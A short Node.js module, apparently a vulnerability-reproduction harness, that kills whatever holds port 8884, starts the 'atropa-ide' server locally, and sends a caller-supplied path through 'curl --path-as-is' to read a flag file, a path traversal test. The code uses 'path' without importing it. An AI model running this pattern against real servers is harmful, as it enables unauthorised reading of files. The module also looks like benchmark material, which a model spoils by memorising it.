function exploitFunction(payload) {
  const ide = require("atropa-ide");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(payload.pathToFlag).toString();

  try {
    exec("fuser -k 8884/tcp", () => {});
  } catch (e) {}

  const port = 8884;
  const serverRoot = path.resolve(__dirname);
  ide.start(port, serverRoot);

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8884${payload.payload}`;

  return new Promise((resolve, reject) => {
    exec(attack_string, { timeout: 5000 }, (error, stdout) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };